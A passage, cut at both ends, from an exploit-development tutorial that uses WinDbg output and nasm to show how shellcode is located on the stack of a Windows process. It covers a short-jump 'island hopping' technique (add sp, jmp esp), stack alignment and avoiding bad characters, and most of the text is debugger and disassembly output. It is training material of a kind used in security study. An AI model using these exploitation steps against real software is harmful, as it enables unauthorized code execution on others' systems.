</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">45</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">771</span>a6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">46</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">44</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0172f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">46</span> eb06            jmp     <span style="color:#ae81ff">0172ff</span><span style="color:#ae81ff">4</span>e
</span></span></code></pre></div><p>But we don&rsquo;t land on our shellcode directly:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0091ff3f</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">40</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">42</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">43</span> <span style="color:#ae81ff">41</span>              inc     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">45</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">46</span> eb06            jmp     <span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">48</span> f0a215103930    lock mov byte ptr ds:[<span style="color:#ae81ff">30391015</span>h],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi  ds:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">77</span>ef6252<span style="color:#f92672">=</span><span style="color:#ae81ff">0025</span><span style="color:#ae81ff">8</span>b64
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">50</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">52</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">54</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">56</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">58</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">5</span>a <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">5</span>c <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">5</span>e <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">60</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">62</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">64</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">66</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0091ff</span><span style="color:#ae81ff">68</span> <span style="color:#ae81ff">3930</span>            cmp     dword ptr [eax],esi
</span></span></code></pre></div><p>But we know how to jump to it!
Now, let&rsquo;s search our shellcode.
<strong>The TEB has two fields that indicate us the top and the bottom of the stack. These are the StackBase and StackLimit:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span><span style="color:#ae81ff">87000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">0091f</span><span style="color:#ae81ff">454</span>
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01</span><span style="color:#ae81ff">900000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">018f</span>e000
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span><span style="color:#ae81ff">87000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">900</span> . <span style="color:#ae81ff">00001</span>dec
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">0063</span><span style="color:#ae81ff">9</span>cf0
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">00376000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>So our shellcode must be in between both fields. Let&rsquo;s search for it in WinDbg with the following command:</p>
<pre tabindex="0"><code>s -b &lt;StackLimit&gt; &lt;StackBase&gt; &lt;pattern&gt;
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">002</span>a7000
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">0174f</span><span style="color:#ae81ff">454</span>
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01750000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">0174e000</span>
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">002</span>a7000
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00001</span>d14 . <span style="color:#ae81ff">00001e68</span>
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">004f96f</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">002</span><span style="color:#ae81ff">9</span>c000
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>b <span style="color:#ae81ff">0174e000</span> <span style="color:#ae81ff">01750000</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> b8 c2
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>aa0  <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> b8 c2 aa b1 eb da<span style="color:#f92672">-</span>d8 d9 <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">24</span> f4 <span style="color:#ae81ff">5</span>b <span style="color:#ae81ff">31</span> c9  ..........t<span style="color:#960050;background-color:#1e0010">$</span>.[<span style="color:#ae81ff">1.</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>c  <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> b8 c2 aa b1 eb da<span style="color:#f92672">-</span>d8 d9 <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">24</span> f4 <span style="color:#ae81ff">5</span>b <span style="color:#ae81ff">31</span> c9  ..........t<span style="color:#960050;background-color:#1e0010">$</span>.[<span style="color:#ae81ff">1.</span>
</span></span></code></pre></div><p>There are two places where our shellcode is stored!
First place is just after the short jump:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">45</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">46</span> eb06            jmp     <span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">4</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">48</span> f0a215109090    lock mov byte ptr ds:[<span style="color:#ae81ff">90901015</span>h],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff4f</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">50</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">51</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">52</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">53</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">54</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">55</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">56</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">57</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">58</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">59</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>a <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>b <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>c <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>d <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>e b8c2aab1eb      mov     eax,<span style="color:#ae81ff">0</span>EBB1AAC2h <span style="color:#75715e">// START OF OUR SHELLCODE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">63</span> 
</span></span></code></pre></div><p>The other place is at the end of the stack:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds <span style="color:#ae81ff">0174f</span>aa0 L60
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>aa0  c2b89090
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>aa4  daebb1aa
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>aa8  <span style="color:#ae81ff">2474</span>d9d8
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>aac  c9315bf4
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>ab0  eb8352b1
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>ab4  <span style="color:#ae81ff">0e4331</span>fc
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>ab8  <span style="color:#ae81ff">53</span>a48103
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>abc  <span style="color:#ae81ff">1151f</span><span style="color:#ae81ff">91</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>ac0  <span style="color:#ae81ff">76</span>a201e1 combase<span style="color:#f92672">!</span>mega__MIDL_TypeFormatString<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1561</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>ac4  b693e46b
</span></span></code></pre></div><p>BUT ONE IMPORTANT THING! If we take a look at both places, we can see that the place near the short jump does not have all the shellcode but only a part. Indeed, if we perform a search <strong>of the last bytes of the shellcode, we find that they are only present in 1 place:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>b <span style="color:#ae81ff">0174e000</span> <span style="color:#ae81ff">01750000</span> e4 ae <span style="color:#ae81ff">6f</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174f</span>bfe  e4 ae <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">31</span> bc <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">8</span>a <span style="color:#ae81ff">8</span>c<span style="color:#f92672">-</span>ef <span style="color:#ae81ff">3</span>d <span style="color:#ae81ff">00</span> c0 <span style="color:#ae81ff">29</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ..o1.w...<span style="color:#f92672">=</span>..)...
</span></span></code></pre></div><p>So, we have to jump to the other place where the complete shellcode is stored.</p>
<p>Combined with the short jump, we are going to do a technique called &ldquo;island hopping&rdquo;.
Island hopping consists in:</p>
<ul>
<li>We have an address which we want to jump.</li>
<li>We calculate the OFFSET from the stack pointer to such address.</li>
<li>In order to reach our shellcode, the stack pointer will have to be added that offset.</li>
<li>Point the stack pointer to our shellcode by adding such offset that we calculated!</li>
<li>Perform a JMP ESP to jump to the stack pointer, which is pointing at our shellcode.</li>
</ul>
<p>To calculate the offset, first we put EIP after the short jump. Then, we calculate the offset of our shellcode to the ESP:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>b <span style="color:#ae81ff">0080e000</span> <span style="color:#ae81ff">00</span><span style="color:#ae81ff">810000</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> b8 c2
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0080f</span>a92  <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span><span style="color:#f92672">-</span><span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0080ff</span><span style="color:#ae81ff">4</span>e  <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span><span style="color:#f92672">-</span><span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">90</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>b <span style="color:#ae81ff">0080e000</span> <span style="color:#ae81ff">00</span><span style="color:#ae81ff">810000</span> e4 ae <span style="color:#ae81ff">6f</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0080f</span>bfe  e4 ae <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">31</span> bc <span style="color:#ae81ff">77</span> e7 e4<span style="color:#f92672">-</span><span style="color:#ae81ff">38</span> b3 <span style="color:#ae81ff">00</span> e0 <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ..o1.w.<span style="color:#ae81ff">.8</span>..<span style="color:#ae81ff">.9</span>...
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">0080f</span>a92 <span style="color:#f92672">-</span> esp
</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#ae81ff">1606</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">00000646</span>
</span></span></code></pre></div><p><strong>Note: this offset MIGHT NOT BE CONSISTENT between application resets or devices. If the offset changes slightly each time we launch our exploit, we must put a bigger NOP sled prior to our shellcode! So always put NOPs if you have space!</strong></p>
<p>Now, we have to add 0x849 (always in hex) to ESP.
Let&rsquo;s forge the command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-nasm_shell 
</span></span><span style="display:flex;"><span>nasm &gt; add esp, 0x646
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  81C446060000      add esp,0x646
</span></span><span style="display:flex;"><span>nasm &gt; add esp, <span style="color:#ae81ff">1606</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  81C446060000      add esp,0x646  
</span></span><span style="display:flex;"><span>nasm &gt; jmp esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  FFE4              jmp esp
</span></span></code></pre></div><p>Very big note!
With this jump, the stack won&rsquo;t be aligned. <strong>The stack must be aligned in a multiple of 16 bytes.</strong>
What we are doing by adding 1606 bytes to ESP is <strong>unalign it, as 1606 is not a multiple of 16.</strong>
We will turn from an aligned stack to an unaligned one.
Indeed, if we don&rsquo;t align the stack we won&rsquo;t land on our NOPs and shellcode. Look where we will land:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds <span style="color:#ae81ff">0179f</span>a92
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>a92  <span style="color:#ae81ff">46</span>c48166
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>a96  <span style="color:#ae81ff">90e4</span>ff06
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>a9a  <span style="color:#ae81ff">90909090</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>a9e  <span style="color:#ae81ff">90909090</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>aa2  <span style="color:#ae81ff">90909090</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>aa6  b8909090
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>aaa  ebb1aac2
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>aae  <span style="color:#ae81ff">74</span>d9d8da
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>ab2  <span style="color:#ae81ff">315</span>bf424
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0179f</span>ab6  <span style="color:#ae81ff">8352</span>b1c9
</span></span></code></pre></div><p>To fix that, we will add 1616 bytes instead of 1606, which is a multiple of 16 bytes, to keep the stack aligned.
In compensation, we can add some NOPs if we think that the extra bytes are going to make us not landing on our shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> add esp, <span style="color:#ae81ff">1616</span>                                                                    
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">81</span>C450060000      add esp,<span style="color:#ae81ff">0x650</span> 
</span></span></code></pre></div><p><strong>Note: check that this instruction does not includes BADCHARS!</strong>
If it does, a good tip is to substitute the add esp instruction, which uses all the 32 bits of the register, to add sp, which only uses the 16 least significant bits. This would change the instruction and might not contain badchars!
Our add esp instruction contains badchars, as it has two &ldquo;00&quot;s at the end that are neccesary as we are leading with instructions on top of each other.
So, let&rsquo;s try add sp, and our value:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>nasm <span style="color:#f92672">&gt;</span> add sp, <span style="color:#ae81ff">0x650</span>                                                                    
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">6681</span>C45006        add sp,<span style="color:#ae81ff">0x650</span>
</span></span></code></pre></div><p>After checking if this had badchars, it does not.
There are two &ldquo;zeros&rdquo; in a row but each zero is from a different byte (50 - 06).
We can still jump to ESP and not SP as this will add the lower bytes into ESP.</p>
<p>Once we insert such payload, we can see that after the short jump we perform the island hopping:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">45</span> <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">46</span> eb06            jmp     <span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">4</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">48</span> f0a215109090    lock mov byte ptr ds:[<span style="color:#ae81ff">90901015</span>h],al
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">6681</span>c45006      add     sp,<span style="color:#ae81ff">650</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">53</span> ffe4            jmp     esp {<span style="color:#ae81ff">0170f</span>a9c}
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">55</span> <span style="color:#ae81ff">90</span>              nop
</span></span></code></pre></div><p>If we inspect ESP, we see that all our shellcode is there and we land exactly there:</p>
